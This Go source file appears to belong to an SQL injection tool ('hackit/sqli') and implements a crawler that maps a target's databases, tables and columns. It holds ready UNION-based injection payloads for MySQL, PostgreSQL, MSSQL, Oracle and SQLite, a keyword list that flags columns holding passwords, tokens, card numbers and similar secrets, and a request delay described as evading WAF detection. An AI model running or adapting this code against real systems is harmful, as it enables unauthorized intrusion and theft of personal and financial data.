package modules

import (
	"fmt"
	"strings"
	"sync"
	"time"
	"hackit/sqli/go/utils"
)

// DeepCrawler performs recursive depth-first database exploration
type DeepCrawler struct {
	engine     EngineInterface
	log        *utils.Logger
	visitedDBs map[string]bool
	mu         sync.Mutex
}

// CrawlResult holds discovered database object info
type CrawlResult struct {
	Type    string `json:"type"`
	Name    string `json:"name"`
	Parent  string `json:"parent,omitempty"`
	Size    int    `json:"size,omitempty"`
	Sensitive bool `json:"sensitive,omitempty"`
}

func NewDeepCrawler(e EngineInterface) *DeepCrawler {
	return &DeepCrawler{
		engine:     e,
		log:        e.GetLogger(),
		visitedDBs: make(map[string]bool),
	}
}

// StartDeepCrawl performs full recursive database exploration
func (dc *DeepCrawler) StartDeepCrawl(param, dbms string) []CrawlResult {
	dc.log.Info("Starting deep crawl...")
	var all []CrawlResult

	// Phase 1: Get all databases
	dbs := dc.crawlDatabases(param, dbms)
	for _, db := range dbs {
		all = append(all, CrawlResult{Type: "database", Name: db})
	}

	// Phase 2: For each non-system DB, get all tables
	var wg sync.WaitGroup
	var mu sync.Mutex
	for _, db := range dbs {
		if isSystemDBSilent(db) {
			continue
		}
		wg.Add(1)
		go func(dbName string) {
			defer wg.Done()
			tables := dc.crawlTables(param, dbms, dbName)
			mu.Lock()
			for _, tbl := range tables {
				all = append(all, CrawlResult{Type: "table", Name: tbl, Parent: dbName})
			}
			mu.Unlock()

			// Phase 3: For each table, get columns
			for _, tbl := range tables {
				cols := dc.crawlColumns(param, dbms, dbName, tbl)
				mu.Lock()
				for _, col := range cols {
					sens := isSensitiveColumn(col)
					all = append(all, CrawlResult{
						Type: "column", Name: col, Parent: dbName + "." + tbl,
						Sensitive: sens,
					})
				}
				mu.Unlock()
			}
		}(db)
	}
	wg.Wait()

	dc.log.Success(fmt.Sprintf("Deep crawl complete: %d objects found", len(all)))
	return all
}

func (dc *DeepCrawler) crawlDatabases(param, dbms string) []string {
	payloads := getDBAggregatePayloads(dbms)
	seen := make(map[string]bool)
	var dbs []string

	for _, p := range payloads {
		body, _, _, err := dc.engine.Request(p, param)
		if err != nil {
			continue
		}
		extracted := extractDataBetween(body, "~", "~")
		for _, db := range strings.Split(extracted, ",") {
			db = strings.TrimSpace(db)
			if len(db) > 0 && !seen[db] && isValidName(db) {
				seen[db] = true
				dbs = append(dbs, db)
			}
		}
		if len(dbs) > 0 {
			break
		}
	}

	// Fallback: row-by-row
	if len(dbs) == 0 {
		dbs = dc.crawlDBsRowByRow(param, dbms, seen)
	}

	return dbs
}

func (dc *DeepCrawler) crawlDBsRowByRow(param, dbms string, seen map[string]bool) []string {
	var dbs []string
	for offset := 0; offset < 200; offset += 10 {
		p := getDBRowPayload(dbms, offset)
		body, _, _, err := dc.engine.Request(p, param)
		if err != nil {
			continue
		}
		extracted := extractDataBetween(body, "~", "~")
		parts := strings.Split(extracted, ",")
		if len(parts) == 0 || (len(parts) == 1 && parts[0] == "") {
			break
		}
		for _, db := range parts {
			db = strings.TrimSpace(db)
			if len(db) > 0 && !seen[db] && isValidName(db) {
				seen[db] = true
				dbs = append(dbs, db)
			}
		}
	}
	return dbs
}

func (dc *DeepCrawler) crawlTables(param, dbms, database string) []string {
	payloads := getTableAggregatePayloads(dbms, database)
	seen := make(map[string]bool)
	var tables []string

	for _, p := range payloads {
		body, _, _, err := dc.engine.Request(p, param)
		if err != nil {
			continue
		}
		extracted := extractDataBetween(body, "~", "~")
		for _, tbl := range strings.Split(extracted, ",") {
			tbl = strings.TrimSpace(tbl)
			if len(tbl) > 0 && !seen[tbl] && isValidName(tbl) {
				seen[tbl] = true
				tables = append(tables, tbl)
			}
		}
		if len(tables) > 0 {
			break
		}
	}

	if len(tables) == 0 {
		tables = dc.crawlTablesRowByRow(param, dbms, database, seen)
	}

	return tables
}

func (dc *DeepCrawler) crawlTablesRowByRow(param, dbms, database string, seen map[string]bool) []string {
	var tables []string
	for offset := 0; offset < 200; offset += 10 {
		p := getTableRowPayload(dbms, database, offset)
		body, _, _, err := dc.engine.Request(p, param)
		if err != nil {
			continue
		}
		extracted := extractDataBetween(body, "~", "~")
		parts := strings.Split(extracted, ",")
		if len(parts) == 0 || (len(parts) == 1 && parts[0] == "") {
			break
		}
		for _, tbl := range parts {
			tbl = strings.TrimSpace(tbl)
			if len(tbl) > 0 && !seen[tbl] && isValidName(tbl) {
				seen[tbl] = true
				tables = append(tables, tbl)
			}
		}
	}
	return tables
}

func (dc *DeepCrawler) crawlColumns(param, dbms, database, table string) []string {
	payloads := getColumnAggregatePayloads(dbms, database, table)
	seen := make(map[string]bool)
	var cols []string

	for _, p := range payloads {
		body, _, _, err := dc.engine.Request(p, param)
		if err != nil {
			continue
		}
		extracted := extractDataBetween(body, "~", "~")
		for _, col := range strings.Split(extracted, ",") {
			col = strings.TrimSpace(col)
			if len(col) > 0 && !seen[col] && isValidName(col) {
				seen[col] = true
				cols = append(cols, col)
			}
		}
		if len(cols) > 0 {
			break
		}
	}
	return cols
}

// getDBAggregatePayloads returns DBMS-specific aggregate DB list queries
func getDBAggregatePayloads(dbms string) []string {
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		return []string{
			"' UNION SELECT GROUP_CONCAT(SCHEMA_NAME SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.SCHEMATA-- -",
			"' UNION SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.TABLES-- -",
		}
	case strings.Contains(dbms, "PostgreSQL"):
		return []string{
			"' UNION SELECT STRING_AGG(datname, '~') FROM pg_database-- -",
		}
	case strings.Contains(dbms, "MSSQL"):
		return []string{
			"' UNION SELECT STRING_AGG(name, '~') FROM sys.databases-- -",
		}
	case strings.Contains(dbms, "Oracle"):
		return []string{
			"' UNION SELECT LISTAGG(username, '~') WITHIN GROUP (ORDER BY username) FROM all_users-- -",
		}
	case strings.Contains(dbms, "SQLite"):
		return []string{
			"' UNION SELECT GROUP_CONCAT(name, '~') FROM pragma_database_list-- -",
		}
	}
	return []string{
		"' UNION SELECT GROUP_CONCAT(SCHEMA_NAME SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.SCHEMATA-- -",
	}
}

func getDBRowPayload(dbms string, offset int) string {
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		return fmt.Sprintf("' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET %d-- -", offset)
	case strings.Contains(dbms, "PostgreSQL"):
		return fmt.Sprintf("' UNION SELECT datname FROM pg_database LIMIT 1 OFFSET %d-- -", offset)
	case strings.Contains(dbms, "MSSQL"):
		return fmt.Sprintf("' UNION SELECT name FROM sys.databases ORDER BY name OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY-- -", offset)
	}
	return fmt.Sprintf("' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET %d-- -", offset)
}

func getTableAggregatePayloads(dbms, database string) []string {
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		return []string{
			fmt.Sprintf("' UNION SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'-- -", database),
		}
	case strings.Contains(dbms, "PostgreSQL"):
		return []string{
			fmt.Sprintf("' UNION SELECT STRING_AGG(tablename, '~') FROM pg_catalog.pg_tables WHERE schemaname='public'-- -"),
		}
	case strings.Contains(dbms, "MSSQL"):
		return []string{
			fmt.Sprintf("' UNION SELECT STRING_AGG(name, '~') FROM sys.tables-- -"),
		}
	case strings.Contains(dbms, "Oracle"):
		return []string{
			fmt.Sprintf("' UNION SELECT LISTAGG(table_name, '~') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner='%s'-- -", strings.ToUpper(database)),
		}
	}
	return []string{
		fmt.Sprintf("' UNION SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'-- -", database),
	}
}

func getTableRowPayload(dbms, database string, offset int) string {
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		return fmt.Sprintf("' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' LIMIT 1 OFFSET %d-- -", database, offset)
	case strings.Contains(dbms, "PostgreSQL"):
		return fmt.Sprintf("' UNION SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public' LIMIT 1 OFFSET %d-- -", offset)
	}
	return fmt.Sprintf("' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' LIMIT 1 OFFSET %d-- -", database, offset)
}

func getColumnAggregatePayloads(dbms, database, table string) []string {
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		return []string{
			fmt.Sprintf("' UNION SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s'-- -", database, table),
		}
	case strings.Contains(dbms, "PostgreSQL"):
		return []string{
			fmt.Sprintf("' UNION SELECT STRING_AGG(column_name, '~') FROM information_schema.columns WHERE table_name='%s'-- -", table),
		}
	case strings.Contains(dbms, "MSSQL"):
		return []string{
			fmt.Sprintf("' UNION SELECT STRING_AGG(name, '~') FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='%s')-- -", table),
		}
	}
	return []string{
		fmt.Sprintf("' UNION SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s'-- -", database, table),
	}
}

func isSensitiveColumn(name string) bool {
	lower := strings.ToLower(name)
	sensitive := []string{
		"password", "passwd", "pass", "pwd", "secret", "token", "auth",
		"credit", "card", "cc_", "cvv", "cvc", "pin", "ssn", "social",
		"security", "key", "api_", "apikey", "secret_key", "private",
		"email", "mail", "phone", "mobile", "address", "zip", "postal",
		"dni", "passport", "license", "bank", "account", "routing",
		"cookie", "session", "csrf", "hash", "salt", "otp", "mfa",
		"wallet", "bitcoin", "crypto", "salary", "grade", "class",
	}
	for _, s := range sensitive {
		if strings.Contains(lower, s) {
			return true
		}
	}
	return false
}

func isSystemDBSilent(name string) bool {
	n := strings.ToLower(name)
	sys := []string{"information_schema", "mysql", "performance_schema",
		"sys", "pg_catalog", "pg_toast", "template0", "template1",
		"postgres", "model", "msdb", "master", "tempdb", "x$"}
	for _, s := range sys {
		if n == s {
			return true
		}
	}
	return false
}

func extractDataBetween(body, start, end string) string {
	si := strings.Index(body, start)
	if si == -1 {
		return ""
	}
	si += len(start)
	ei := strings.Index(body[si:], end)
	if ei == -1 {
		return ""
	}
	return body[si : si+ei]
}

// DeepCrawlToResults formats crawl results as Result slice
func (dc *DeepCrawler) DeepCrawlToResults(param, dbms string) []Result {
	results := dc.StartDeepCrawl(param, dbms)
	var out []Result
	for _, r := range results {
		details := ""
		if r.Sensitive {
			details = "[SENSITIVE]"
		}
		out = append(out, Result{
			Parameter:  "deep-crawl",
			Type:       "deep-" + r.Type,
			Payload:    r.Parent,
			DBMS:       dbms,
			Details:    r.Name + " " + details,
			Confidence: 1.0,
		})
	}
	dc.log.Success(fmt.Sprintf("Deep crawl generated %d results", len(out)))
	return out
}

// TimeDelay between requests to avoid WAF detection
func (dc *DeepCrawler) TimeDelay() {
	time.Sleep(50 * time.Millisecond)
}
